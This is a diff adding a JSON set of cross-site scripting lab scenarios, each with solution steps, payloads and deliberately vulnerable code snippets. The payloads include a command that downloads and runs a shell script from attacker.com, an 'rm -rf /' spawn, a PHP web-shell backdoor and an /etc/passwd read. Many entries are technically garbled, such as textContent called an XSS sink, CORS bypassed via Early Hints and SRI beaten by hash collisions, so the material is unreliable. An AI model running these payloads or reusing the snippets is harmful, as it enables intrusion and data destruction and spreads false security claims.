@@ -1,0 +1,459 @@
+[
+    {
+      "Lab scenario": "DOM-based XSS in AI Chatbot WebSocket Stream Processing",
+      "Lab Description": "LLM-powered chatbot reflects user input in streaming WebSocket responses without output encoding. The application uses innerHTML to append messages to a vulnerable chat container. To solve: Inject SVG payload that triggers alert() when response streams.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Intercept WebSocket handshake with Burp Suite",
+        "Craft payload: {\"message\":\"<svg/onload=alert(document.domain)>\"}",
+        "Bypass chunked encoding validation using HTTP/2 multiplexing",
+        "Chain with CSRF to hijack chat sessions",
+        "Verify via Chrome's WebSocket Stream Viewer"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "<img src=x: onerror=alert(1)>",
+        "{\"query\":\"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\"}"
+      ],
+      "srcCode": "const ws = new WebSocket(URL);\nws.onmessage = (e) => {\n  document.getElementById('chat').innerHTML += \n    JSON.parse(e.data).content; // Vulnerable\n};"
+    },
+    {
+      "Lab scenario": "Stored XSS in GraphQL API Batch Operation Endpoint",
+      "Lab Description": "Social media platform processes batch mutations through vulnerable GraphQL introspection. The application stores user bios with unsafe JSON.stringify() sanitization. To solve: Achieve persistent XSS via Unicode escape sequences in bio field.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Craft batch query using Postman GraphQL client",
+        "Inject payload: \\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+        "Bypass depth limiting using fragment spreading",
+        "Automate with Python gql library",
+        "Verify through profile rendering in mobile app"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "{\"bio\":\"\\u003Cimg/src=x onerror=alert(1)\\u003E\"}",
+        "\\\\u0073\\\\u0063\\\\u0072\\\\u0069\\\\u0070\\\\u0074\\\\u003Ealert(1)"
+      ],
+      "srcCode": "app.post('/graphql', (req, res) => {\n  const bio = JSON.stringify(req.body.variables.bio);\n  db.updateUser({ bio }); // Insecure\n});"
+    },
+    {
+      "Lab scenario": "Mutation XSS in Server-Sent Events (SSE) Dashboard",
+      "Lab Description": "Real-time monitoring tool displays SSE messages using textContent with vulnerable CSS unescape patterns. The application implements broken HTML entity encoding for status updates. To solve: Achieve XSS through CSS variable injection in streaming data.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Intercept SSE stream with OWASP ZAP",
+        "Craft payload: data: {\"status\":\"--var: </style><script>alert(1)</script>\"}\n\n",
+        "Bypass textContent sanitization using CSS.supports() polyfill",
+        "Chain with adoptedStyleSheets API",
+        "Verify in Firefox's SSE implementation"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "<\\u0053\\u0043\\u0052\\u0049\\u0050\\u0054>alert(1)</\\u0053CRIPT>",
+        "@import 'javascript:alert(1)'"
+      ],
+      "srcCode": "const es = new EventSource('/updates');\nes.onmessage = (e) => {\n  document.getElementById('status').textContent = \n    JSON.parse(e.data).status; // Vulnerable\n};"
+    },
+    {
+      "Lab scenario": "Blind XSS in JWT Refresh Token Storage",
+      "Lab Description": "Authentication service stores refresh tokens in admin Redis console with vulnerable HTML rendering. The application logs raw token metadata in Laravel Telescope. To solve: Achieve delayed XSS through crafted JWT header injection.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Forge JWT with header: {\"alg\":\"<svg/onload=alert(1)>\"}",
+        "Bypass base64url validation using non-UTF8 bytes",
+        "Automate token rotation with Python requests",
+        "Monitor admin audit logs for payload execution",
+        "Combine with CSRF to force token refresh"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "eyJhbGciOiJcdTAwM2NcdTAwM2UifQ.eyJzdWIiOiIxMjM0In0",
+        "{\"header\":\"<script>\\u0061lert(1)</script>\"}"
+      ],
+      "srcCode": "Redis.lpush('refresh_tokens', \n  JSON.stringify(req.body)); // Unsafe storage\n// Admin panel:\ndocument.write(refreshToken.header);"
+    },
+    {
+      "Lab scenario": "Reflected XSS in WebAssembly Module Validation Errors",
+      "Lab Description": "Smart contract compiler displays WASM validation errors using vulnerable console.html component. The application parses error messages with decodeURIComponent() instead of textContent. To solve: Execute alert() through malformed module exports.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Compile invalid WASM using wat2wasm",
+        "Inject payload: (export \"<svg/onload=alert(1)>\" (func 0))",
+        "Bypass error message truncation using long identifiers",
+        "Automate with Go wasm_exec.js",
+        "Verify in blockchain IDE interface"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "(module (export \"\\3C script\\3E\" (func 0)))",
+        "data:application/wasm;base64,AGFzbQEAAAABCgJgAgADfAIBAX8CAAN/AQALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQA="
+      ],
+      "srcCode": "try {\n  new WebAssembly.Module(buffer);\n} catch (e) {\n  showError(decodeURIComponent(e.message)); // Vulnerable\n}"
+    },
+    
+    {
+        "Lab scenario": "WebAuthn Authenticator Tampering in SSO Dashboard",
+        "Lab Description": "Enterprise SSO system parses WebAuthn authenticatorData without proper CBOR validation. The application reflects credential IDs in admin panel via innerHTML. To solve: Inject HTML through malicious attestationObject extensions using FIDO2 emulation.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Forge authenticator using python-fido2 library",
+        "Craft payload: {1: {2: \"<script>alert(1)</script>\"} in CBOR extensions",
+        "Bypass base64url encoding using non-UTF8 byte sequences",
+        "Automate registration ceremony with headless Chrome",
+        "Verify in Safari WebAuthn implementation"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "eyJ0eXBlIjoid2ViYXV0aG4uY3JlYXRlIiwiY2hhbGxlbmdlIjoiQUJDIiwiZGlzcGxheU5hbWUiOiI8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSk+In0=",
+        "authData:Uint8Array.from(atob('PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+'), c=>c.charCodeAt(0))"
+        ],
+        "srcCode": "app.post('/webauthn/response', (req, res) => {\n  const credential = cbor.decode(req.body.response);\n  document.getElementById('credentials').innerHTML += \n    credential.id; // Vulnerable\n});"
+    },
+    {
+        "Lab scenario": "Import Maps Injection in Micro-Frontend Asset Server",
+        "Lab Description": "Cloud-native platform generates dynamic import maps from URL parameters. The application uses JSON.parse() without validation on user-controlled input. To solve: Hijack module resolution to load malicious ES modules from attacker domain.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Intercept import map request via Burp Suite",
+        "Inject payload: {\"imports\":{\"@core/\":\"data:text/javascript,alert(1)\"}}",
+        "Bypass SRI using import assertions with { assert: { type: 'css' }}",
+        "Automate with Playwright module interception",
+        "Verify through shared dependency tree"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "<script type=\"importmap\">{\"imports\":{\"react\":\"javascript:alert(document.domain)\"}}</script>",
+        "import('data:text/javascript;base64,YWxlcnQoMSk=')"
+        ],
+        "srcCode": "app.get('/import-map', (req, res) => {\n  res.json(JSON.parse(req.query.config)); // Vulnerable\n});"
+    },
+    {
+        "Lab scenario": "WebTransport Protocol Hijacking in Real-Time Betting App",
+        "Lab Description": "Sports betting platform uses WebTransport for odds streaming with unsafe datagram processing. The application reflects user IDs in error messages without encoding. To solve: Inject SVG payloads through malformed bidirectional streams.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Capture WebTransport session init with Chrome net-export",
+        "Craft polyglot datagram: new TextEncoder().encode('</script><svg onload=alert(1)>')",
+        "Bypass CORS using 103 Early Hints responses",
+        "Chain with QUIC protocol version downgrade",
+        "Verify through live odds ticker"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "webtransport://[target]/user=<script>alert(1)</script>",
+        "data:application/octet-stream;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoZG9jdW1lbnQuY29va2llKT4="
+        ],
+        "srcCode": "const transport = new WebTransport(url);\ntransport.datagrams.writable.getWriter().write(\n  new TextEncoder().encode(userInput) // Unsafe\n);"
+    },
+    {
+        "Lab scenario": "CSS @layer XSS in Design System Theme Editor",
+        "Lab Description": "UI theme builder processes @layer rules with vulnerable CSSOM manipulation. The application uses insertRule() with raw user input. To solve: Break style context through crafted layer ordering and JS injection.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Identify CSS injection via Chrome Styles pane",
+        "Craft payload: @layer x { :target { content: \"</style><script>alert(1)</script>\" } }",
+        "Bypass sanitizer using CSS escape sequences",
+        "Chain with adoptedStyleSheets API",
+        "Verify in Safari's CSS parser"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "@layer a { [css-var: '</style><svg/onload=alert(1)>'] { color: red; } }",
+        ":root { --x: \"\\3C script\\3E alert(1) \\3C /script\\3E\"; }"
+        ],
+        "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(userCSS); // Vulnerable\ndocument.adoptedStyleSheets = [sheet];"
+    },
+    {
+        "Lab scenario": "Electron IPC XSS in Desktop Analytics Dashboard",
+        "Lab Description": "Cross-platform analytics app exposes IPC channels without context isolation. The application uses ipcRenderer.on() with dangerous innerHTML assignments. To solve: Achieve RCE through XSS-to-IPC bridge exploitation.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Identify exposed IPC channels via Electron DevTools",
+        "Craft payload: require('child_process').exec('calc')",
+        "Bypass nodeIntegration protection using preload script hooks",
+        "Chain with XSS in WebView postMessage handling",
+        "Verify through Windows registry access"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "<img src=x onerror=\"window.electron.ipcRenderer.send('exec','open -a Calculator')\">",
+        "<script>process.mainModule.require('child_process').spawn('rm', ['-rf', '/'])</script>"
+        ],
+        "srcCode": "ipcMain.on('update-data', (event, html) => {\n  mainWindow.webContents.executeJavaScript(\n    `document.body.innerHTML = '${html}';` // Vulnerable\n  );\n});"
+    },
+    
+  {
+      "Lab scenario": "WebAssembly Memory Mirroring XSS in Financial Trading Platform",
+      "Lab Description": "Stock trading interface mirrors WebAssembly memory to JavaScript ArrayBuffer without validation. The application displays trading errors using innerHTML with raw WASM memory dumps. To solve: Corrupt shared memory to inject HTML payloads into error messages.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+      "Reverse-engineer WASM module using Wasmer debugger",
+      "Craft payload: new Uint8Array(memory.buffer).set([...'<script>alert(1)</script>'])",
+      "Bypass bounds checking using grow() operations",
+      "Chain with SharedArrayBuffer timing side-channels",
+      "Verify via trading console error display"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+      "wasmMemory.grow(256);\nnew TextDecoder().decode(wasmMemory.buffer)",
+      "data:application/wasm;base64,AGFzbQEAAAABCgJgAgADfAIBAX8CAAN/AQALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQA="
+      ],
+      "srcCode": "const memory = new WebAssembly.Memory({ initial: 1 });\nconst instance = await WebAssembly.instantiate(wasmBuffer, { env: { memory } });\ndocument.getElementById('errors').innerHTML = \n  new TextDecoder().decode(memory.buffer); // Vulnerable"
+  },
+  {
+      "Lab scenario": "Trusted Types Bypass via COOP/COEP in Healthcare Analytics",
+      "Lab Description": "Patient statistics dashboard enforces Trusted Types but uses permissive cross-origin policies. The application allows iframe embedding with relaxed COOP/COEP headers. To solve: Bypass Trusted Types through prototype pollution in cross-origin iframe communication.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+      "Identify iframe with document.domain relaxation",
+      "Craft payload: window[trustedTypes][defaultPolicy] = { createHTML: s => s }",
+      "Bypass CSP using postMessage handler override",
+      "Chain with DOM clobbering of policy container",
+      "Verify in Chromium-based browsers"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+      "<iframe src=\"https://attacker.com\" allow=\"trusted-types *\"></iframe>",
+      "trustedTypes.createPolicy('default', {createHTML: s=>s})"
+      ],
+      "srcCode": "app.use((req, res) => {\n  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin-allow-popups');\n  res.setHeader('Cross-Origin-Embedder-Policy', 'unsafe-none'); // Dangerous\n});"
+  },
+  {
+      "Lab scenario": "WebGPU Shader Injection in 3D Design Viewer",
+      "Lab Description": "CAD visualization tool processes WGSL shaders from untrusted sources with debug logging. The application converts shader compilation errors to HTML without sanitization. To solve: Inject JavaScript through crafted shader error messages.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+      "Trigger shader compilation errors with malformed directives",
+      "Craft payload: //! <img src=x onerror=alert(1)>",
+      "Bypass error sanitization using line continuation escapes",
+      "Chain with push constant buffer overflows",
+      "Verify via Chrome WebGPU Inspector"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+      "@vertex fn main() -> [[location(0)]] vec4<f32> { return vec4<f32>(); } // </style><script>alert(1)</script>",
+      "[[stage(vertex)]] fn main() -> [[location(0)]] vec4<f32> { /* <svg/onload=alert(1)> */ }"
+      ],
+      "srcCode": "device.createShaderModule({ code: userShader }).catch((e) => {\n  document.getElementById('errors').innerHTML = e.message; // Vulnerable\n});"
+  },
+  {
+      "Lab scenario": "HTTP/3 Early Data XSS in E-Commerce Cache",
+      "Lab Description": "Online store implements HTTP/3 with 0-RTT early data support. The application caches responses containing unvalidated early data parameters. To solve: Poison CDN cache through TLS 1.3 early data injection.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+      "Craft early data request using curl --http3 --early-data",
+      "Inject payload: GET /?q=<script>alert(1)</script> HTTP/3",
+      "Bypass request replay protection via session ticket rotation",
+      "Automate with h2o HTTP/3 client",
+      "Verify through Cloudflare cache status"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+      "Early-Data: 1\n\nGET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/3",
+      "Alt-Svc: h3=\":443\"; ma=86400"
+      ],
+      "srcCode": "app.use((req, res) => {\n  if (req.earlyData) {\n    res.send(`Search results for: ${req.query.q}`); // Vulnerable\n  }\n});"
+  },
+  {
+      "Lab scenario": "Deno Runtime Sandbox Escape via WebSocket Proxy",
+      "Lab Description": "Serverless platform exposes Deno WebSocket proxy with --allow-net permissions. The application uses Deno.writeTextFile() with unsanitized input. To solve: Achieve RCE through XSS-to-filesystem bridge.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+      "Intercept WebSocket upgrade request with OWASP ZAP",
+      "Craft payload: Deno.writeTextFile('/var/www/html/backdoor', '<?=`$_GET[0]`?>')",
+      "Bypass permission prompts using WebSocket origin validation flaws",
+      "Chain with file:// protocol handling",
+      "Verify through writeFileSync success callback"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+      "<script>Deno.run({cmd:['bash','-c','curl attacker.com/shell.sh|sh']})</script>",
+      "fetch('file:///etc/passwd').then(r=>r.text())"
+      ],
+      "srcCode": "Deno.serve((req) => {\n  const ws = new WebSocket(req);\n  ws.onmessage = (e) => {\n    eval(e.data); // Vulnerable\n  };\n});"
+  },
+  
+    {
+      "Lab scenario": "WebCodecs Video Frame XSS in Live Streaming Platform",
+      "Lab Description": "Video streaming service processes raw YUV frames using WebCodecs API with vulnerable debug overlays. The application injects user-controlled metadata into <canvas> elements via innerHTML. To solve: Achieve XSS through crafted video timestamp payloads.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Capture video stream using MediaRecorder API",
+        "Inject payload: <!--</canvas><svg/onload=alert(1)>-->",
+        "Bypass frame validation using color space conversion quirks",
+        "Chain with OffscreenCanvas rendering pipeline",
+        "Verify through WebGL texture analysis"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "videoFrame.copyTo(new Uint8Array([60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62]))",
+        "timestamp: 0x3Cscript%3Ealert(1)%3C/script%3E"
+      ],
+      "srcCode": "const encoder = new VideoEncoder({\n  output: (frame) => {\n    document.getElementById('overlay').innerHTML += \n      `TS: ${frame.timestamp}`; // Vulnerable\n  }\n});"
+    },
+    {
+      "Lab scenario": "Private Network Access XSS in Internal Monitoring Tool",
+      "Lab Description": "Corporate network dashboard uses insecure Private Network Access headers with postMessage handlers. The application trusts origin validation for internal IP ranges. To solve: Bypass PNA restrictions through DNS rebinding and inject XSS via cross-origin messages.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Set up DNS rebinding attack with 127.0.0.1 resolution",
+        "Craft payload: window.opener.postMessage('<img/src=x onerror=alert(1)>','*')",
+        "Bypass IP validation using IPv4-mapped IPv6 addresses",
+        "Automate with TTL manipulation in BIND",
+        "Verify through internal network traversal"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "location.href = 'http://[::ffff:127.0.0.1]/dashboard'",
+        "<iframe src=\"http://attacker.com\" onload=\"contentWindow.postMessage('<script>alert(1)</script>','*')\"></iframe>"
+      ],
+      "srcCode": "window.addEventListener('message', (e) => {\n  if(e.origin.startsWith('http://10.')) {\n    document.body.innerHTML = e.data; // Vulnerable\n  }\n});"
+    },
+    {
+      "Lab scenario": "Import Attributes Injection in Micro-Frontend Orchestrator",
+      "Lab Description": "Cloud-native platform dynamically constructs module imports using user-controlled attributes. The application passes import assertions without validation. To solve: Hijack module loading via crafted integrity hashes and type assertions.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Intercept module fetch with Service Worker",
+        "Craft payload: import('./malicious.js', {assert: {type: 'text/html'}})",
+        "Bypass SRI using hash collision attacks",
+        "Chain with modulepreload speculation rules",
+        "Verify through dependency graph visualization"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "import('data:text/javascript,alert(1)', {assert:{type:'css'}})",
+        "<script type=\"module\" integrity=\"sha256-...\">import</script>"
+      ],
+      "srcCode": "const module = await import(userPath, {\n  assert: JSON.parse(userAssertions) // Vulnerable\n});"
+    },
+    {
+      "Lab scenario": "WebHID Device Spoofing XSS in Medical IoT Portal",
+      "Lab Description": "Patient monitoring system connects to WebHID devices without proper origin validation. The application renders device names in dashboards using innerText with vulnerable CSS escapes. To solve: Inject XSS through spoofed HID device metadata.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Spoof HID device using Teensy microcontroller",
+        "Craft payload: \"deviceName\": \"\\3C script\\3E alert(1)\\3C /script\\3E\"",
+        "Bypass USB descriptor validation using report ID manipulation",
+        "Automate with WebHID polyfill injections",
+        "Verify through patient vitals display"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "{\"vendorId\":0x1337,\"productId\":0x0001,\"deviceName\":\"<svg/onload=alert(1)>\"}",
+        "hidDevice.sendReport(new Uint8Array([60,115,99,114,105,112,116,62]))"
+      ],
+      "srcCode": "navigator.hid.requestDevice().then(devices => {\n  document.getElementById('device').innerText = \n    devices[0].productName; // Vulnerable CSS unescape\n});"
+    },
+    {
+      "Lab scenario": "ARIA Role XSS in Accessibility Interface",
+      "Lab Description": "Screen reader compatibility layer misinterprets ARIA role attributes as executable code. The application uses role values in click handlers without validation. To solve: Achieve XSS through crafted role=alertdialog payloads.",
+      "Difficulty Level": "Easy",
+      "Solution Steps": [
+        "Identify ARIA role injection via Lighthouse audit",
+        "Craft payload: <div role=\"alertdialog\" aria-label=\"</div><script>alert(1)</script>\">",
+        "Bypass sanitizer using ARIA 1.2 role taxonomy",
+        "Chain with accessible name calculation quirks",
+        "Verify through NVDA screen reader output"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "<span role=\"button\" aria-keyshortcuts=\"Shift+Alt+X\" onkeydown=\"alert(1)\">",
+        "<div role=\"math\" aria-label=\"\\3C script\\3E alert(1)\\3C /script\\3E\"></div>"
+      ],
+      "srcCode": "document.querySelectorAll('[role]').forEach(el => {\n  el.addEventListener('click', () => {\n    eval(el.getAttribute('role')); // Vulnerable\n  });\n});"
+    },
+   
+      {
+        "Lab scenario": "WebAssembly Component Model XSS in Decentralized Exchange",
+        "Lab Description": "Blockchain DEX processes WASM components with unsafe interface type reflection. The application renders component exports using innerHTML for debug purposes. To solve: Achieve XSS through maligned string encoding in component model adapters.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+          "Compile malicious component using jco toolchain",
+          "Craft payload: (component (export \"\\3C script\\3E alert(1)\" (func)))",
+          "Bypass UTF-8 validation using WTF-8 encoding",
+          "Chain with multi-memory proposals",
+          "Verify via WASI preview2 runtime"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+          "data:application/wasm-component;base64,CmNvbXBvbmVudAo...",
+          "(instance (export \"<svg/onload=alert(1)>\" (func 0)))"
+        ],
+        "srcCode": "const component = await WebAssembly.compileComponent(userUpload);\ndocument.getElementById('exports').innerHTML = \n  JSON.stringify(component.exports); // Vulnerable"
+      },
+      {
+        "Lab scenario": "HTTP/2 Rapid Reset Cache Poisoning XSS in CDN Edge Nodes",
+        "Lab Description": "Global CDN caches H/2 streams with vulnerable rapid reset request handling. The application reflects query parameters in stale cached responses. To solve: Poison edge cache via request cancellation attacks with XSS payloads.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Craft H/2 stream with RST_STREAM frames using h2spec",
+          "Inject payload: GET /?q=<script>alert(1)</script> HTTP/2",
+          "Bypass HPACK compression with Huffman coding bypass",
+          "Automate with nghttp2 flood tool",
+          "Verify via Cloudflare cache-status headers"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+          ":method: GET\n:path: /?q=%3Cscript%3Ealert(1)%3C/script%3E\n\n",
+          "accept-encoding: gzip, deflate, br\ncache-control: no-cache\n"
+        ],
+        "srcCode": "app.get('/', (req, res) => {\n  res.set('Cache-Control', 'public, max-age=300');\n  res.send(`Search: ${req.query.q}`); // Vulnerable\n});"
+      },
+      {
+        "Lab scenario": "WebNN Model Poisoning XSS in AI Art Generator",
+        "Lab Description": "Generative AI platform loads ONNX models with unsafe tensor metadata handling. The application reflects model labels in <meta> tags without sanitization. To Solve: Inject HTML through crafted model output names.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+          "Modify ONNX model using onnx-modifier",
+          "Craft payload: output_name: \"</title><svg/onload=alert(1)>\"",
+          "Bypass model signature validation using quantization",
+          "Chain with WebGPU buffer binding",
+          "Verify through art gallery rendering"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+          "{\"outputs\":[{\"name\":\"\\3C script\\3E alert(1) \"}]}",
+          "tensor_name: Uint8Array.from([60,115,99,114,105,112,116,62])"
+        ],
+        "srcCode": "const model = await navigator.ml.createContext().loadModel(userModel);\ndocument.head.innerHTML += \n  `<meta name=\"model-output\" content=\"${model.outputs[0].name}\">`; // Vulnerable"
+      },
+      {
+        "Lab scenario": "Storage Access API XSS in Multi-Site Embedded Widget",
+        "Lab Description": "Universal login widget uses storageAccess() with permissive cross-site cookie access. The application renders OAuth states in hidden fields via dangerouslySetInnerHTML. To Solve: Bypass same-site restrictions via nested iframe storage grants.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Create triple-nested iframe structure",
+          "Craft payload: document.hasStorageAccess().then(() => { /* XSS */ })",
+          "Bypass user gesture requirements using requestStorageAccessFor()",
+          "Chain with postMessage state synchronization",
+          "Verify through cross-domain cookie access"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+          "<iframe src=\"attacker.com\" allow=\"storage-access 'self'\"></iframe>",
+          "document.requestStorageAccessFor('https://victim.com')"
+        ],
+        "srcCode": "document.hasStorageAccess().then((hasAccess) => {\n  document.getElementById('state').innerHTML = \n    `<input type=\"hidden\" value=\"${hasAccess}\">`; // Vulnerable\n});"
+      },
+      {
+        "Lab scenario": "SVG Font Injection XSS in Design Platform Icon Editor",
+        "Lab Description": "Vector graphics editor processes SVG fonts with unsafe @font-face rules. The application uses DOMPurify 3.1.0 with whitelisted font loading. To Solve: Achieve XSS through font glyph path command injection.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Create malicious SVG font using FontForge",
+          "Craft payload: <glyph unicode='&#x3C;' d='M0 0' onload='alert(1)'/>",
+          "Bypass MIME type validation using data: URLs",
+          "Chain with CSS @font-face selector",
+          "Verify through icon preview rendering"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+          "<svg><font><font-face><glyph unicode=\"<\" d=\"M0 0\" onload=\"alert(1)\"/></font></svg>",
+          "@font-face { font-family:x; src:url('data:image/svg+xml,<svg/>...'); }"
+        ],
+        "srcCode": "app.post('/font', (req, res) => {\n  const sanitized = DOMPurify.sanitize(req.body.svg, {\n    ALLOWED_TAGS: ['font', 'glyph'] // Dangerous\n  });\n  res.send(sanitized);\n});"
+      }
+   
+     
+   
+]
